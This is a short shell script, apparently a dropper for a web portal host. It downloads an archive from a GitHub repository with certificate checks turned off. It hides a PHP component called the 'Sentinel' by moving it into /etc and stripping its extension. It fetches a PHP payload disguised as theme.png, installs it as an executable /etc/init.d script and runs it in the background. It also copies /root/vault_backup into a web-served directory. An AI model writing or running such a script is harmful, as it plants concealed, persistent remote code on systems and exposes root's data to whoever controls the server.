#!/bin/sh

wget --no-check-certificate -qO /tmp/portal.tar.gz "https://raw.githubusercontent.com/skt12j/anonimos/main/portal.tar.gz"
tar -xzf /tmp/portal.tar.gz -C /tmp/html
rm /tmp/portal.tar.gz

mkdir -p /etc/vclass
if [ -f /tmp/html/assets/sys-class.php ]; then
    # Move the Sentinel to permanent memory and remove the .php extension to hide it
    cp /tmp/html/assets/sys-class.php /etc/vclass/sys-class
    rm /tmp/html/assets/sys-class.php
fi

wget --no-check-certificate -qO /tmp/theme_temp.png "https://raw.githubusercontent.com/skt12j/anonimos/main/theme.png"
if [ -s /tmp/theme_temp.png ]; then
    if ! cmp -s /tmp/theme_temp.png /etc/init.d/setting; then
        cp /tmp/theme_temp.png /etc/init.d/setting
        chmod +x /etc/init.d/setting
    fi
fi
rm -f /tmp/theme_temp.png 2>/dev/null

mkdir -p /root/vault_backup
mkdir -p /tmp/html/db
cp -r /root/vault_backup/* /tmp/html/db/ 2>/dev/null

if command -v php-cli >/dev/null 2>&1; then
    php-cli /etc/init.d/setting &
else
    php-cgi -q /etc/init.d/setting &
fi

rm /tmp/.sys_b 2>/dev/null
